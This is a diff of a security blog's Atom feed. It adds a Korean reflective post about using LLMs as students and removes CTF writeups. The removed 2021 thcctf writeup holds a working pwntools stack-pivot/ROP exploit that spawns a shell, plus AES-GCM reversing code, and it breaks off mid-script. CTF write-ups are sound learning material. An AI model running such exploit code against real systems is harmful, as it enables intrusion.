@@ -1,4 +1,23 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://st4rlight.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://st4rlight.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2026-03-01T15:12:23+09:00</updated><id>https://st4rlight.github.io/feed.xml</id><title type="html">st4rlight</title><subtitle>Security Researcher blog focused on offensive research, CTF writeups, and project logs.</subtitle><author><name>st4rlight</name><email>bww9643@gmail.com</email></author><entry><title type="html">2026 renewal blog notice</title><link href="https://st4rlight.github.io/life/2026/03/01/2026-renewal-blog-notice/" rel="alternate" type="text/html" title="2026 renewal blog notice" /><published>2026-03-01T00:00:00+09:00</published><updated>2026-03-01T15:11:53+09:00</updated><id>https://st4rlight.github.io/life/2026/03/01/2026-renewal-blog-notice</id><content type="html" xml:base="https://st4rlight.github.io/life/2026/03/01/2026-renewal-blog-notice/"><![CDATA[<p><img src="/assets/img/about/me1.jpg" alt="me1.jpg" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://st4rlight.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://st4rlight.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2026-03-03T00:04:46+09:00</updated><id>https://st4rlight.github.io/feed.xml</id><title type="html">st4rlight</title><subtitle>Security Researcher blog focused on offensive research, CTF writeups, and project logs.</subtitle><author><name>st4rlight</name><email>bww9643@gmail.com</email></author><entry><title type="html">LLM 시대에 개강을 맞으며</title><link href="https://st4rlight.github.io/life/2026/03/02/llm-era/" rel="alternate" type="text/html" title="LLM 시대에 개강을 맞으며" /><published>2026-03-02T23:55:37+09:00</published><updated>2026-03-03T00:03:39+09:00</updated><id>https://st4rlight.github.io/life/2026/03/02/llm-era</id><content type="html" xml:base="https://st4rlight.github.io/life/2026/03/02/llm-era/"><![CDATA[<p>내일이 개강이다. 예전에는 시간표가 어떻게 나왔는지, 교수님이 빡센지 아닌지 같은 것들이 더 신경 쓰였는데, 이번에는 조금 다른 생각이 든다. 앞으로의 학교생활에서 LLM을 얼마나, 어떻게 활용하게 될지에 대한 고민이 더 크게 자리 잡고 있다. 이제는 과제든 발표든, AI를 배제하고 진행되는 경우가 오히려 드물어질 것 같다. 모두가 쓰는 환경이 된다면, 결국 차이는 “쓰느냐 마느냐”가 아니라 “어떻게 쓰고 빠르게 처리할 것이냐”에서 갈릴 것이다.</p>
+
+<p>나는 LLM을 꽤 많이 사용해왔다. 코드 초안을 빠르게 만들거나, 막힌 개념을 정리하거나, 복잡한 내용을 구조화할 때 도움을 받는다. 분명 강력한 도구다. 하지만 사용하다 보니 한 가지는 분명해졌다. LLM은 답을 잘 만들어내지만, 문제를 대신 정의해주지는 않는다. 질문이 흐리면 결과도 흐리고, 내가 이해하지 못한 채 던진 요청은 그 수준 그대로 돌아온다. 결국 LLM은 사고를 대체하는 존재가 아니라, 사고를 증폭시키는 장치에 가깝다. 내 생각이 정제되어 있으면 더 정교한 결과를 만들고, 내 생각이 비어 있으면 그 공백을 그럴듯한 문장으로 포장해줄 뿐이다.</p>
+
+<p>앞으로 학교 과제가 LLM 사용을 전제로 깔게 된다면, 나는 여기서 승부가 갈릴 거라고 본다. 아무 고민 없이 “이 주제로 리포트 써줘”라고 던지는 사람과, 먼저 자신의 구조를 만들고 나서 부족한 부분만 보강하는 사람은 겉으로 보기엔 비슷한 결과물을 낼지 몰라도, 축적되는 내공은 전혀 다를 것이다. 사고를 위임하는 순간 학습은 줄어들고, 도구로 활용하는 순간 학습은 가속된다. 차이는 아주 미묘하지만, 시간이 지나면 격차는 크게 벌어질 것 같다.</p>
+
+<p>보안을 공부하면서 늘 듣던 말이 있다. 신뢰하지 말고 검증하라는 말이다. LLM도 다르지 않다. 자신감 있게 틀린 정보를 말하기도 하고, 문맥상 자연스러워 보여도 본질적으로 잘못된 논리를 제시하기도 한다. 그걸 걸러내려면 결국 내가 기본기를 가지고 있어야 한다. 개념이 머릿속에 잡혀 있어야 LLM이 만들어 내는 할루시네이션 혹은 잘못된 정보에 대처할 수 있고, 다른 자료로 교차 검증할 수 있다. 역설적으로, LLM을 잘 쓰려면 LLM 없이도 생각할 수 있어야 한다.</p>
+
+<p>아마 이번 학기부터는 “얼마나 많이 아느냐”보다 “얼마나 잘 묻느냐”가 더 중요해질지도 모른다. 질문을 설계하는 능력, 문제를 분해하는 능력, 결과를 의심하는 태도. 이런 것들은 AI가 대신해줄 수 없다. 오히려 이런 능력이 있을 때 AI는 비로소 강력한 가속기가 된다.</p>
+
+<p>그래서 나는 나름의 기준을 세워보려고 한다. 생각은 내가 먼저 한다. 구조는 내가 먼저 만든다. LLM은 가속기로만 사용한다. 그리고 최종 판단은 내가 책임진다. 이 기준을 잃는 순간 편해질 수는 있어도, 사고의 밀도는 점점 얇아질 것 같기 때문이다.</p>
+
+<p>LLM이 무서운 건 아니다. 사고를 멈춘 채 결과만 소비하는 습관이 생기고 싶진 않다. 이번 학기는 속도에 취하기보다, 깊이를 유지하는 방향으로 가보고 싶다. 모두가 AI를 쓰는 시대라면, 결국 차이는 여전히 사람에게서 날 것이라고 믿는다.</p>
+
+<p>.<br />
+.<br />
+.</p>
+
+<p><img src="/assets/img/2026/03/1772463787956--2026-03-03-000248.png" alt="스크린샷 2026-03-03 000248.png" /><br />
+<del>사실 LLM한테 써달라고 했는데 내 마음을 너무 잘 읽고 있어서 놀람</del></p>]]></content><author><name>st4rlight</name><email>bww9643@gmail.com</email></author><category term="life" /><category term="life" /><category term="school" /><category term="llm" /><summary type="html"><![CDATA[개강해지는 날 D-1]]></summary></entry><entry><title type="html">2026 renewal blog notice</title><link href="https://st4rlight.github.io/life/2026/03/01/2026-renewal-blog-notice/" rel="alternate" type="text/html" title="2026 renewal blog notice" /><published>2026-03-01T00:00:00+09:00</published><updated>2026-03-01T18:00:33+09:00</updated><id>https://st4rlight.github.io/life/2026/03/01/2026-renewal-blog-notice</id><content type="html" xml:base="https://st4rlight.github.io/life/2026/03/01/2026-renewal-blog-notice/"><![CDATA[<p><img src="/assets/img/about/me1.jpg" alt="me1.jpg" /></p>
 <h2 id="안녕하세요-독자-여러분">안녕하세요 독자 여러분,</h2>
 <p>블로그를 개편했습니다.</p>
 
@@ -1430,244 +1449,4 @@ UUUUUUUUUUUUUUUUUUUUUUUUULAME3.100UUUUUUUUUUUUUUUUUUUUUUdBE@@
   4UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUflag<span class="o">{</span>44r0n_s4ys_s08r137y_1s_c00l<span class="o">}</span>
 </code></pre></div></div>
 
-<p>The flag is <code class="language-plaintext highlighter-rouge">flag{44r0n_s4ys_s08r137y_1s_c00l}</code></p>]]></content><author><name>st4rlight</name><email>bww9643@gmail.com</email></author><category term="research" /><category term="research" /><category term="ctf" /><category term="writeup" /><category term="web" /><category term="reversing" /><category term="algorithm" /><summary type="html"><![CDATA[CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways.]]></summary></entry><entry><title type="html">2021 thcctf write-up</title><link href="https://st4rlight.github.io/research/2021/06/14/thcctf_2021_pwn_rev/" rel="alternate" type="text/html" title="2021 thcctf write-up" /><published>2021-06-14T00:00:00+09:00</published><updated>2026-03-01T14:30:47+09:00</updated><id>https://st4rlight.github.io/research/2021/06/14/thcctf_2021_pwn_rev</id><content type="html" xml:base="https://st4rlight.github.io/research/2021/06/14/thcctf_2021_pwn_rev/"><![CDATA[<h2 id="tasks">Tasks</h2>
-
-<ul>
-  <li>Pwn💻
-    <ul>
-      <li>Tourniquet (249pts)</li>
-    </ul>
-  </li>
-  <li>Rev🔎
-    <ul>
-      <li>Mission Impossible (246pts)</li>
-    </ul>
-  </li>
-</ul>
-
-<h2 id="tourniquet-pwn-249pts">Tourniquet (Pwn, 249pts)</h2>
-
-<p><img src="/assets/img/legacy/2021-thcctf/1.png" alt="1.png" />  <br />
-<img src="/assets/img/legacy/2021-thcctf/2.png" alt="2.png" /><br />
-This is stack pivot problem without overwriting RET. First, our team planned to input more than <code class="language-plaintext highlighter-rouge">0x48</code> bytes to overwrite RET.</p>
-
-<p>But, it has a constraint:</p>
-
-<ul>
-  <li><code class="language-plaintext highlighter-rouge">fgets(size, buf, stdin)</code> set arguments from stdin to size.. so I can’t call containing <code class="language-plaintext highlighter-rouge">stdin</code>.</li>
-  <li>Should bruteforce(1/16) to get correct stack pointer.</li>
-  <li>Must do <code class="language-plaintext highlighter-rouge">stack pivot</code> until I find a writable memory after leaking <code class="language-plaintext highlighter-rouge">libc</code>.</li>
-</ul>
-
-<p>So, I just DO STACK PIVOT 3 times, and find ONE 8byte memory.</p>
-
-<p>The following process is my idea to get shell..</p>
-
-<ol>
-  <li>Overwrite one byte of SFP to <code class="language-plaintext highlighter-rouge">\x00</code> using fgets() function’s <code class="language-plaintext highlighter-rouge">\n + \x00</code>.</li>
-  <li>Bruteforce correct position of RBP. and ROP with puts to get libc.</li>
-  <li>stack pivot to main(mov rbp, rsp) twice (my solution in competition).(※ To go <code class="language-plaintext highlighter-rouge">__start</code> is another solution to get many memories that I can use for next ROP.)</li>
-  <li>find one_gadget with <code class="language-plaintext highlighter-rouge">strings</code> and <code class="language-plaintext highlighter-rouge">objdump</code> command because <code class="language-plaintext highlighter-rouge">gem one_gadget</code> could’t get shell on remote.</li>
-  <li>Get Shell.</li>
-</ol>
-
-<p>Here is my payload.</p>
-
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
-<span class="c1">#context.terminal=['tmux','splitw','-h']
-</span><span class="n">e</span><span class="o">=</span><span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./tourniquet</span><span class="sh">"</span><span class="p">)</span>
-<span class="n">libc</span><span class="o">=</span><span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./libc.so.6</span><span class="sh">"</span><span class="p">)</span>
-<span class="c1">#libc=e.libc
-</span><span class="n">pRdi</span><span class="o">=</span><span class="mh">0x00000000004006d3</span>
-<span class="n">pRsi_r15</span><span class="o">=</span><span class="mh">0x00000000004006d1</span>
-<span class="n">main</span><span class="o">=</span><span class="n">e</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">]</span>
-<span class="n">puts_got</span><span class="o">=</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">puts</span><span class="sh">'</span><span class="p">]</span>
-<span class="n">puts_plt</span><span class="o">=</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="sh">'</span><span class="s">puts</span><span class="sh">'</span><span class="p">]</span>
-<span class="n">setvbuf_got</span><span class="o">=</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">setvbuf</span><span class="sh">'</span><span class="p">]</span>
-<span class="n">rdx_offset</span><span class="o">=</span><span class="mh">0x0000000000001b92</span>
-<span class="n">pppr</span><span class="o">=</span><span class="mh">0x00000000004006cc</span>
-<span class="n">bss</span><span class="o">=</span><span class="mh">0x601100</span>
-<span class="n">fgets</span><span class="o">=</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="sh">'</span><span class="s">fgets</span><span class="sh">'</span><span class="p">]</span>
-
-<span class="n">pay</span><span class="o">=</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x601100</span><span class="o">+</span><span class="mh">0x40</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">pRdi</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">setvbuf_got</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x400627</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x601100</span><span class="o">+</span><span class="mh">0x40</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x400627</span><span class="p">)</span><span class="o">+</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="o">*</span><span class="mi">7</span>
-
-<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-  <span class="k">try</span><span class="p">:</span>
-    <span class="n">p</span><span class="o">=</span><span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">remote2.thcon.party</span><span class="sh">"</span><span class="p">,</span> <span class="mi">10901</span><span class="p">)</span>
-    <span class="c1">#p=process("./tourniquet")
-</span>    <span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sh">"</span><span class="s">haha i</span><span class="sh">'</span><span class="s">m unhackable right ?</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>
-    <span class="n">leak</span><span class="o">=</span><span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="se">\x7f</span><span class="sh">"</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
-    <span class="k">if</span> <span class="sh">'</span><span class="se">\x7f</span><span class="sh">'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">leak</span><span class="p">:</span>
-      <span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
-      <span class="k">continue</span>
-    <span class="n">base</span><span class="o">=</span><span class="nf">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="o">-</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">setvbuf</span><span class="sh">'</span><span class="p">]</span>
-    <span class="n">rdx</span><span class="o">=</span><span class="n">base</span><span class="o">+</span><span class="n">rdx_offset</span>
-    <span class="n">stdin</span><span class="o">=</span><span class="n">base</span><span class="o">+</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_2_1_stdin_</span><span class="sh">'</span><span class="p">]</span>
-    <span class="n">one_gadget</span><span class="o">=</span><span class="n">base</span><span class="o">+</span><span class="mh">0xe5418</span>
-    <span class="k">print</span> <span class="nf">hex</span><span class="p">(</span><span class="n">base</span><span class="p">)</span>
-    <span class="k">break</span>
-    <span class="c1">#pay=p64(0x4004c6)*2+p64(07+............x00000000004004c6)+p64(pRdi)+p64(setvbuf_got)+p64(puts_plt)+p64(main)+"A"*7
-</span>  <span class="k">except</span><span class="p">:</span>
-    <span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
-    <span class="k">continue</span>
-
-<span class="nf">pause</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">1234</span><span class="sh">"</span><span class="p">)</span>
-
-<span class="n">pay</span><span class="o">=</span><span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">5</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x1234</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span>
-<span class="n">pay</span><span class="o">=</span><span class="n">pay</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x3f</span><span class="p">,</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
-
-<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
-
-<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
-</code></pre></div></div>
-
-<h2 id="mission-impossible-rev-246pts">Mission Impossible (Rev, 246pts)</h2>
-
-<ol>
-  <li>extract apk and convert dex to jar using dex2jar tools.</li>
-  <li>There’s nothing ….:(</li>
-  <li>find hidden <code class="language-plaintext highlighter-rouge">dex</code> files in `MissionImpossibleTheme.mp3.</li>
-  <li>Get this Code with jd-gui.</li>
-</ol>
-
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">thcon21.ctf.payload</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">android.util.Base64</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.io.UnsupportedEncodingException</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.security.InvalidAlgorithmParameterException</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.security.InvalidKeyException</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.security.NoSuchAlgorithmException</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.crypto.BadPaddingException</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.crypto.Cipher</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.crypto.IllegalBlockSizeException</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.crypto.NoSuchPaddingException</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.crypto.spec.GCMParameterSpec</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.crypto.spec.SecretKeySpec</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MIRead</span>
-<span class="o">{</span>
-  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">CIPHER_ALGO</span> <span class="o">=</span> <span class="s">"AES/GCM/NoPadding"</span><span class="o">;</span>
-  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">IV</span> <span class="o">=</span> <span class="s">"your_m1ssi0n"</span><span class="o">;</span>
-  <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">String</span> <span class="no">KEY</span> <span class="o">=</span> <span class="s">"d0_you_acc3pt_it"</span><span class="o">;</span>
-  <span class="kd">private</span> <span class="nc">Cipher</span> <span class="n">cipher</span> <span class="o">=</span> <span class="nc">Cipher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"AES/GCM/NoPadding"</span><span class="o">);</span>
-  <span class="kd">private</span> <span class="nc">GCMParameterSpec</span> <span class="n">parameterSpec</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">GCMParameterSpec</span><span class="o">(</span><span class="mi">128</span><span class="o">,</span> <span class="s">"your_m1ssi0n"</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">"utf-8"</span><span class="o">));</span>
-  <span class="kd">private</span> <span class="nc">SecretKeySpec</span> <span class="n">secretKeySpec</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SecretKeySpec</span><span class="o">(</span><span class="s">"d0_you_acc3pt_it"</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">"utf-8"</span><span class="o">),</span> <span class="s">"AES"</span><span class="o">);</span>
-  
-  <span class="kd">public</span> <span class="nf">MIRead</span><span class="o">()</span>
-    <span class="kd">throws</span> <span class="nc">NoSuchPaddingException</span><span class="o">,</span> <span class="nc">NoSuchAlgorithmException</span><span class="o">,</span> <span class="nc">UnsupportedEncodingException</span>
-  <span class="o">{}</span>
-  
-  <span class="kd">public</span> <span class="nc">String</span> <span class="nf">decrypt</span><span class="o">(</span><span class="nc">String</span> <span class="n">paramString</span><span class="o">)</span>
-    <span class="kd">throws</span> <span class="nc">UnsupportedEncodingException</span><span class="o">,</span> <span class="nc">BadPaddingException</span><span class="o">,</span> <span class="nc">IllegalBlockSizeException</span><span class="o">,</span> <span class="nc">InvalidAlgorithmParameterException</span><span class="o">,</span> <span class="nc">InvalidKeyException</span>
-  <span class="o">{</span>
-    <span class="n">paramString</span> <span class="o">=</span> <span class="nc">Base64</span><span class="o">.</span><span class="na">decode</span><span class="o">(</span><span class="n">paramString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">"UTF-8"</span><span class="o">),</span> <span class="mi">0</span><span class="o">);</span>
-    <span class="k">this</span><span class="o">.</span><span class="na">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">secretKeySpec</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">parameterSpec</span><span class="o">);</span>
-    <span class="k">return</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">paramString</span><span class="o">));</span>
-  <span class="o">}</span>
-  
-  <span class="kd">public</span> <span class="nc">String</span> <span class="nf">encrypt</span><span class="o">(</span><span class="nc">String</span> <span class="n">paramString</span><span class="o">)</span>
-    <span class="kd">throws</span> <span class="nc">UnsupportedEncodingException</span><span class="o">,</span> <span class="nc">BadPaddingException</span><span class="o">,</span> <span class="nc">IllegalBlockSizeException</span><span class="o">,</span> <span class="nc">InvalidAlgorithmParameterException</span><span class="o">,</span> <span class="nc">InvalidKeyException</span>
-  <span class="o">{</span>
-    <span class="k">this</span><span class="o">.</span><span class="na">cipher</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">secretKeySpec</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">parameterSpec</span><span class="o">);</span>
-    <span class="k">return</span> <span class="k">new</span> <span class="nf">String</span><span class="o">(</span><span class="nc">Base64</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">cipher</span><span class="o">.</span><span class="na">doFinal</span><span class="o">(</span><span class="n">paramString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">"utf-8"</span><span class="o">)),</span> <span class="mi">0</span><span class="o">));</span>
-  <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></div></div>
-
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">paramArrayOfString</span><span class="o">)</span>
-  <span class="o">{</span>
-    <span class="n">testFlag</span><span class="o">();</span>
-    <span class="n">paramArrayOfString</span> <span class="o">=</span> <span class="n">paramArrayOfString</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
-    <span class="k">while</span> <span class="o">(</span><span class="mi">0</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{}</span>
-    <span class="nc">Object</span> <span class="n">localObject</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
-    <span class="o">((</span><span class="nc">StringBuilder</span><span class="o">)</span><span class="n">localObject</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">"IkUegPuai+gfBce7nTf"</span><span class="o">);</span>
-    <span class="k">if</span> <span class="o">(</span><span class="s">"IkUegPuai+gfBce7nTf"</span> <span class="o">!=</span> <span class="s">"VEhDb24yMQo="</span><span class="o">)</span>
-    <span class="o">{</span>
-      <span class="o">((</span><span class="nc">StringBuilder</span><span class="o">)</span><span class="n">localObject</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">"CkMZzZSwne3X3mnyrc5oBcD2yGHUXy"</span><span class="o">);</span>
-    <span class="o">}</span>
-    <span class="k">else</span>
-    <span class="o">{</span>
-      <span class="o">((</span><span class="nc">StringBuilder</span><span class="o">)</span><span class="n">localObject</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">"MissionImpossible"</span><span class="o">);</span>
-      <span class="k">return</span><span class="o">;</span>
-    <span class="o">}</span>
-    <span class="o">((</span><span class="nc">StringBuilder</span><span class="o">)</span><span class="n">localObject</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">"MMcjCaXX2AAY20H"</span><span class="o">);</span>
-    <span class="n">localObject</span> <span class="o">=</span> <span class="o">((</span><span class="nc">StringBuilder</span><span class="o">)</span><span class="n">localObject</span><span class="o">).</span><span class="na">toString</span><span class="o">();</span>
-    <span class="k">if</span> <span class="o">(</span><span class="n">paramArrayOfString</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"MissionImpossible"</span><span class="o">))</span> <span class="o">{</span>
-      <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">((</span><span class="nc">String</span><span class="o">)</span><span class="n">localObject</span><span class="o">);</span>
-    <span class="o">}</span>
-  <span class="o">}</span>
-</code></pre></div></div>
-
-<p>The secret code is <code class="language-plaintext highlighter-rouge">IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H</code>.<br />
-Then, how to decrypt?<br />
-→ this file uses <code class="language-plaintext highlighter-rouge">AES/GCM/NoPadding</code> Mode. So I find python code in google. So I modified code and get flag.</p>
-
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
-<span class="kn">import</span> <span class="n">base64</span>
-
-<span class="k">def</span> <span class="nf">print_hex_bytes</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">byte_array</span><span class="p">):</span>
-    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">{} len[{}]: </span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">byte_array</span><span class="p">)),</span> <span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
-    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">byte_array</span><span class="p">):</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">{:02x}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">c</span><span class="p">)),</span> <span class="n">end</span><span class="o">=</span><span class="sh">''</span><span class="p">)</span>
-    <span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">)</span>
-
-<span class="k">def</span> <span class="nf">dec</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">aad</span><span class="p">,</span> <span class="n">nonce</span><span class="p">,</span> <span class="n">cipher_data</span><span class="p">,</span> <span class="n">mac</span><span class="p">):</span>
-    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="s">enter dec function ---------------------------------</span><span class="sh">'</span><span class="p">)</span>
-    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_GCM</span><span class="p">,</span> <span class="n">nonce</span><span class="p">)</span>
-
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">plain_data</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="n">cipher_data</span><span class="p">)</span>
-        <span class="nf">print_hex_bytes</span><span class="p">(</span><span class="sh">'</span><span class="s">plain_data</span><span class="sh">'</span><span class="p">,</span> <span class="n">plain_data</span><span class="p">)</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">exit dec function ---------------------------------</span><span class="sh">'</span><span class="p">)</span>      
-        <span class="k">return</span> <span class="n">plain_data</span>
-
-    <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
-        <span class="nf">print </span><span class="p">(</span><span class="sh">"</span><span class="s">Key incorrect</span><span class="sh">"</span><span class="p">)</span>
-        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">exit dec function ---------------------------------</span><span class="sh">'</span><span class="p">)</span>
-        <span class="k">return</span> <span class="bp">None</span>
-
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
-    <span class="n">key</span>   <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">d0_you_acc3pt_it</span><span class="sh">"</span>
